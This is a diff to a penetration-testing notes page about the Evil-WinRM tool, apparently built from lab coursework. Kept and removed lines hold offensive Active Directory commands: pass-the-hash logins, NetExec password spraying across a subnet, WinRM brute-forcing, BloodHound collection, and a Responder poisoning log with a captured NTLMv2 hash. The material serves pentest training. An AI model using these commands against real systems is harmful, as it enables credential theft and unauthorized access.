@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/evil-winrm.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Check WinRM access with a known credential
+[Search this tool’s saved examples](/commands/notebook?tool=evil-winrm) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Check WinRM access with a known credential
 
 **Run in:** Kali. **Requires:** WinRM reachable on the chosen transport and an account allowed to use its endpoint; add -S for a configured HTTPS endpoint.
 
@@ -21,54 +29,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 evil-winrm -i TARGET_IP -u 'DOMAIN\USER' -p 'PASSWORD'
 ```
 
-**Read the result:** A successful session identifies a WinRM-authorized account; use whoami and privilege checks to establish its actual token.
-
-**If SMB authentication works but WinRM denies the session:** WinRM reachability and authorization differ from SMB. The current remote token may not carry credentials for a second network hop.
+**What the result establishes:** A successful session identifies a WinRM-authorized account; use whoami and privilege checks to establish its actual token.
 
 **Next check:** Check endpoint authorization and the actual remote token; test a second network hop separately instead of assuming credentials are delegated.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://github.com/Hackplayers/evil-winrm)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## Evil-WinRM: choose the operation and read the result
-
-Open a Windows PowerShell session over WinRM; the account needs endpoint access.
-
-### What the result establishes
-
-A successful session identifies a WinRM-authorized account; use whoami and privilege checks to establish its actual token.
-
-### Prerequisites and common failures
-
-WinRM reachability and authorization differ from SMB. The current remote token may not carry credentials for a second network hop.
-
-### Example 1: Commands
-
-Run in: **Kali**.
-
-```bash
-evil-winrm -i TARGET_IP -u USER -p 'PASSWORD'
-evil-winrm -i TARGET_IP -u USER -H NT_HASH
-# HTTPS
-evil-winrm -S -i TARGET_IP -u USER -p 'PASSWORD'
-```
-
-## Saved commands and notebook recipes
-
-Open a Windows PowerShell session over WinRM; the account needs endpoint access.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=evil-winrm) · [All tools](/index)
 
 ## Commands
 
@@ -81,18 +44,15 @@ evil-winrm -i TARGET_IP -u USER -H NT_HASH
 evil-winrm -S -i TARGET_IP -u USER -p 'PASSWORD'
 ```
 
-{/* VAULT_ORIGINAL_LINK_START */}
+## If it fails
 
-**Original note sections:** [Windows Remote Access: RDP, WinRM, and WMI — Example 1: Commands](/enumeration/windows-remote-management-protocols-cheat-sheet#example-1-commands-2) · [Evil-WinRM — Connect to Windows — Example 1: Commands](/tools/evil-winrm#example-1-commands)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+| Symptom | Check |
+| --- | --- |
+| SMB authentication works but WinRM denies the session | WinRM reachability and authorization differ from SMB. The current remote token may not carry credentials for a second network hop. |
 
 ## Notebook recipes
 
-45 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+28 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
@@ -140,90 +100,6 @@ proxychains evil-winrm -i 172.16.119.11 -u Administrator -H <NTHASH>
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Active Directory Attack Path: Worked Lab — 11. File transfer over a pivot](/cheatsheets/ad-attack-path-worked-example#11-file-transfer-over-a-pivot)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Authentication / Connectivity">
-
-### Authentication / Connectivity
-
-**Active Directory Enumeration Commands**
-
-```bash
-nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>
-    # Check whether credentials work against the DC over SMB
-
-nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>
-    # Authenticate to LDAP and verify credentials
-
-nxc winrm <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>
-    # Check whether the account can access WinRM
-
-nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --shares
-    # Enumerate SMB shares accessible to the account
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Enumeration Commands — Authentication / Connectivity](/active-directory/command-reference#authentication-/-connectivity)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Bloodhound">
-
-### Bloodhound
-
-**Active Directory Enumeration Commands**
-
-```text
-bloodhound-python -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -dc <DC_FQDN> -ns <DC_IP> -c All
-    # Collect AD relationship data for BloodHound
-
-Useful BloodHound relationships to look for:
-
-MemberOf
-    # Group membership
-
-AdminTo
-    # User/group has administrative access to a computer
-
-GenericAll
-    # Full control over an object
-
-GenericWrite
-    # Write permissions over an object
-
-WriteDACL
-    # Can modify an object's permissions
-
-WriteOwner
-    # Can change object ownership
-
-ForceChangePassword
-    # Can change another user's password
-
-AddMember
-    # Can add a principal to a group
-
-CanRDP
-    # Can use Remote Desktop
-
-CanPSRemote
-    # Can use PowerShell Remoting / WinRM
-
-AllowedToDelegate
-    # Delegation relationship
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Enumeration Commands — Bloodhound](/active-directory/command-reference#bloodhound)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -290,132 +166,6 @@ wmiexec.py '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>'
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Active Directory Enumeration Commands — Remote Access](/active-directory/command-reference#remote-access)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Windows Local Groups">
-
-### Windows Local Groups
-
-**Active Directory Enumeration Commands**
-
-```powershell
-net localgroup
-    # List local groups on a Windows machine
-
-net localgroup Administrators
-    # Show members of the local Administrators group
-
-net localgroup "Remote Management Users"
-    # Show users allowed to use WinRM
-
-net localgroup "Backup Operators"
-    # Show members of Backup Operators
-
-net localgroup "Server Operators"
-    # Show members of Server Operators
-
-whoami /groups
-    # Show groups belonging to the current Windows account
-
-whoami /priv
-    # Show privileges assigned to the current Windows account
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Enumeration Commands — Windows Local Groups](/active-directory/command-reference#windows-local-groups)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Forced Authentication Attacks">
-
-### Forced Authentication Attacks
-
-**Common Services: Full Module Reference**
-
-```bash
-grcic550@htb[/htb]$ sudo responder -I ens33
-
-                                         __
-  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
-  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
-  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
-                   |__|
-
-           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
-
-  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
-  To kill this script hit CTRL-C
-
-[+] Poisoners:
-    LLMNR                      [ON]
-    NBT-NS                     [ON]
-    DNS/MDNS                   [ON]
-
-[+] Servers:
-    HTTP server                [ON]
-    HTTPS server               [ON]
-    WPAD proxy                 [OFF]
-    Auth proxy                 [OFF]
-    SMB server                 [ON]
-    Kerberos server            [ON]
-    SQL server                 [ON]
-    FTP server                 [ON]
-    IMAP server                [ON]
-    POP3 server                [ON]
-    SMTP server                [ON]
-    DNS server                 [ON]
-    LDAP server                [ON]
-    RDP server                 [ON]
-    DCE-RPC server             [ON]
-    WinRM server               [ON]
-
-[+] HTTP Options:
-    Always serving EXE         [OFF]
-    Serving EXE                [OFF]
-    Serving HTML               [OFF]
-    Upstream Proxy             [OFF]
-
-[+] Poisoning Options:
-    Analyze Mode               [OFF]
-    Force WPAD auth            [OFF]
-    Force Basic Auth           [OFF]
-    Force LM downgrade         [OFF]
-    Fingerprint hosts          [OFF]
-
-[+] Generic Options:
-    Responder NIC              [tun0]
-    Responder IP               [10.10.14.198]
-    Challenge set              [random]
-    Don't Respond To Names     ['ISATAP']
-
-[+] Current Session Variables:
-    Responder Machine Name     [WIN-2TY1Z1CIGXH]
-    Responder Domain Name      [HF2L.LOCAL]
-    Responder DCE-RPC Port     [48162]
-
-[+] Listening for events...
-
-[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
-[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
-[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
-[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
-[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
-[SMB] NTLMv2-SSP Client   : 10.10.110.17
-[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
-[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Common Services: Full Module Reference — Forced Authentication Attacks](/modules/common-services/full-reference#forced-authentication-attacks)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -613,40 +363,6 @@ At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
 
 </Accordion>
 
-<Accordion title="Workaround #2: Register PSSession Configuration">
-
-### Workaround #2: Register PSSession Configuration
-
-**Kerberos Double Hop**
-
-```powershell
-PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
-
- WARNING: When RunAs is enabled in a Windows PowerShell session configuration, the Windows security model cannot enforce
- a security boundary between different user sessions that are created by using this endpoint. Verify that the Windows
-PowerShell runspace configuration is restricted to only the necessary set of cmdlets and capabilities.
-WARNING: Register-PSSessionConfiguration may need to restart the WinRM service if a configuration using this name has
-recently been unregistered, certain system data structures may still be cached. In that case, a restart of WinRM may be
- required.
-All WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and session
-configurations that are created with the Register-PSSessionConfiguration cmdlet, are disconnected.
-
-   WSManConfig: Microsoft.WSMan.Management\WSMan::localhost\Plugin
-
-Type            Keys                                Name
-----            ----                                ----
-Container       {Name=backupadmsess}                backupadmsess
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Kerberos Double Hop — Workaround #2: Register PSSession Configuration](/active-directory/kerberos-double-hop#workaround-#2-register-pssession-configuration)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
 <Accordion title="Flag 1 — Shadow Credentials → jpinkman">
 
 ### Flag 1 — Shadow Credentials → jpinkman
@@ -765,35 +481,7 @@ evil-winrm -i dc01 -r inlanefreight.htb
 **Password Attacks: Cracking, Files, and Credential Stores**
 
 ```bash
-netexec winrm 10.129.42.197 -u user.list -p password.list
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Password Attacks: Cracking, Files, and Credential Stores — WinRM (5985/HTTP, 5986/HTTPS)](/password-attacks/password-attacks-cheat-sheet#winrm-5985/http-5986/https)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Password Attacks: Cracking, Files, and Credential Stores**
-
-```bash
 evil-winrm -i 10.129.42.197 -u user -p password
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Password Attacks: Cracking, Files, and Credential Stores — WinRM (5985/HTTP, 5986/HTTPS)](/password-attacks/password-attacks-cheat-sheet#winrm-5985/http-5986/https)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Password Attacks: Cracking, Files, and Credential Stores**
-
-Context from the notebook: Installs via  sudo gem install evil-winrm . Gives a PowerShell Remoting session.
-
-```text
-sudo gem install evil-winrm
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
@@ -1001,32 +689,6 @@ Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p P
 
 </Accordion>
 
-<Accordion title="The box &amp; the users">
-
-### The box & the users
-
-**Windows Post-Exploitation: Field Reference**
-
-```cmd
-systeminfo                                   :: OS build/patch level (for kernel exploits)
-hostname & ver
-net user                                     :: local users
-net user <name>                              :: groups + last logon of a user
-net localgroup administrators                :: who is local admin
-net localgroup "Remote Desktop Users"        :: who can RDP
-net localgroup "Remote Management Users"     :: who can WinRM
-query user                                   :: WHO IS LOGGED IN RIGHT NOW (jump-host gold)
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Windows Post-Exploitation: Field Reference — The box & the users](/cheatsheets/windows-post-exploitation#the-box-&-the-users)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
 <Accordion title="Transfer (full detail in the Pivoting cheatsheet)">
 
 ### Transfer (full detail in the Pivoting cheatsheet)
@@ -1097,50 +759,6 @@ evil-winrm -i <IP> -u <user> -p '<pass>' -s /scripts/ # load PS scripts
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
-**Windows Remote Access: RDP, WinRM, and WMI**
-
-```powershell
-# From Windows
-Test-WsMan <host>                                  # is WinRM reachable?
-Enter-PSSession -ComputerName <IP> -Credential <domain\user>
-Invoke-Command -ComputerName <IP> -Credential <user> -ScriptBlock { whoami }
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Windows Remote Access: RDP, WinRM, and WMI — Footprinting & connecting](/enumeration/windows-remote-management-protocols-cheat-sheet#footprinting-&-connecting)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Validating creds &amp; spraying across hosts (NetExec)">
-
-### Validating creds & spraying across hosts (NetExec)
-
-**Windows Remote Access: RDP, WinRM, and WMI**
-
-```bash
-# Does this credential work on this protocol, and is it admin? (Pwn3d! = local admin)
-netexec winrm <IP> -u <user> -p '<pass>'
-netexec smb   <IP> -u <user> -p '<pass>'
-netexec rdp   <IP> -u <user> -p '<pass>'
-
-# Spray ONE credential across a whole subnet to find every host it works on
-netexec smb 172.16.1.0/24 -u <user> -p '<pass>'
-
-# Works with a hash instead of a password (Pass-the-Hash)
-netexec winrm <IP> -u <user> -H <NTLM_hash>
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Windows Remote Access: RDP, WinRM, and WMI — Validating creds & spraying across hosts (NetExec)](/enumeration/windows-remote-management-protocols-cheat-sheet#validating-creds-&-spraying-across-hosts-netexec)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
 </Accordion>
 
 <Accordion title="WinRM and RDP">
@@ -1167,148 +785,11 @@ command -v xfreerdp
 
 </Accordion>
 
-<Accordion title="⏱️ HOW TO USE THIS — decision header (&quot;if you have X, do Y&quot;)">
-
-### ⏱️ HOW TO USE THIS — decision header ("if you have X, do Y")
-
-**Active Directory Attack Path: Worked Lab**
-
-Context from the notebook: Need a file off an internal host evil-winrm download , or stage via the DMZ host 11
-
-```text
-evil-winrm download
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Attack Path: Worked Lab — ⏱️ HOW TO USE THIS — decision header ("if you have X, do Y")](/cheatsheets/ad-attack-path-worked-example#-how-to-use-this-—-decision-header-if-you-have-x-do-y) · [Active Directory Attack Path: Worked Lab — 🚨 GLOBAL CAVEATS (the stuff that wasted hours)](/cheatsheets/ad-attack-path-worked-example#-global-caveats-the-stuff-that-wasted-hours) · [Pivoting and File Transfer: Field Reference — ⏱️ DECISION HEADER](/cheatsheets/pivoting-file-transfer#-decision-header) · [Pivoting and File Transfer: Field Reference — 🧯 CAVEATS TABLE](/cheatsheets/pivoting-file-transfer#-caveats-table)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="🚨 GLOBAL CAVEATS (the stuff that wasted hours)">
-
-### 🚨 GLOBAL CAVEATS (the stuff that wasted hours)
-
-**Active Directory Attack Path: Worked Lab**
-
-Context from the notebook: evil-winrm: OPENSSL_init_ssl (RuntimeError) Broken  /etc/ssl/openssl.cnf  (typo'd section, e.g.  deck  vs  sect ) revert openssl.cnf; quick bypass  OPENSSL_CONF=/dev/null evil-winrm ...
-
-```text
-evil-winrm: OPENSSL_init_ssl (RuntimeError)
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Attack Path: Worked Lab — 🚨 GLOBAL CAVEATS (the stuff that wasted hours)](/cheatsheets/ad-attack-path-worked-example#-global-caveats-the-stuff-that-wasted-hours) · [Pass the Certificate: PKINIT and Lab Walkthrough — Troubleshooting log (everything that bit me, and the fix)](/password-attacks/pass-the-certificate#troubleshooting-log-everything-that-bit-me-and-the-fix)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Active Directory Attack Path: Worked Lab**
-
-Context from the notebook: evil-winrm: OPENSSL_init_ssl (RuntimeError) Broken  /etc/ssl/openssl.cnf  (typo'd section, e.g.  deck  vs  sect ) revert openssl.cnf; quick bypass  OPENSSL_CONF=/dev/null evil-winrm ...
-
-```text
-OPENSSL_CONF=/dev/null evil-winrm ...
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Attack Path: Worked Lab — 🚨 GLOBAL CAVEATS (the stuff that wasted hours)](/cheatsheets/ad-attack-path-worked-example#-global-caveats-the-stuff-that-wasted-hours) · [Pass the Certificate: PKINIT and Lab Walkthrough — Troubleshooting log (everything that bit me, and the fix)](/password-attacks/pass-the-certificate#troubleshooting-log-everything-that-bit-me-and-the-fix)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Group &amp; access edges">
-
-### Group & access edges
-
-**BloodHound: Full Reference**
-
-Context from the notebook: CanPSRemote WinRM allowed evil-winrm -i &lt;host> -u u -p p
-
-```text
-evil-winrm -i <host> -u u -p p
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [BloodHound: Full Reference — Group & access edges](/cheatsheets/bloodhound-complete-guide#group-&-access-edges)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Common problems">
-
-### Common problems
-
-**Evil-WinRM — Connect to Windows**
-
-Context from the notebook: Host expects HTTPS Check  evil-winrm -h  for the SSL and port options for that endpoint.
-
-```text
-evil-winrm -h
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Evil-WinRM — Connect to Windows — Common problems](/tools/evil-winrm#common-problems)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="NetExec (the multi-protocol workhorse)">
-
-### NetExec (the multi-protocol workhorse)
-
-**Password Attacks: Cracking, Files, and Credential Stores**
-
-Context from the notebook: Supports  nfs, ftp, ssh, winrm, smb, wmi, rdp, mssql, ldap, vnc . Used for spraying, brute-forcing, share enumeration, hash dumping, and more.
-
-```text
-nfs, ftp, ssh, winrm, smb, wmi, rdp, mssql, ldap, vnc
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Password Attacks: Cracking, Files, and Credential Stores — NetExec (the multi-protocol workhorse)](/password-attacks/password-attacks-cheat-sheet#netexec-the-multi-protocol-workhorse)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Windows Remote Access">
-
-### Windows Remote Access
-
-**Ports, Protocols, and Services by Purpose**
-
-Context from the notebook: WinRM 5985/5986 PowerShell remoting evil-winrm -i &lt;IP> -u &lt;user> -p &lt;pass>
-
-```text
-evil-winrm -i <IP> -u <user> -p <pass>
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Ports, Protocols, and Services by Purpose — Windows Remote Access](/reference/master-protocol-service-quick-reference#windows-remote-access)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
 </AccordionGroup>
+
+## Related tools and references
+
+- [Official documentation 1](https://github.com/Hackplayers/evil-winrm)
 
 {/* VAULT_RELATED_START */}
 
@@ -1317,5 +798,3 @@ evil-winrm -i <IP> -u <user> -p <pass>
 - [Evil-WinRM — Connect to Windows](/tools/evil-winrm)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
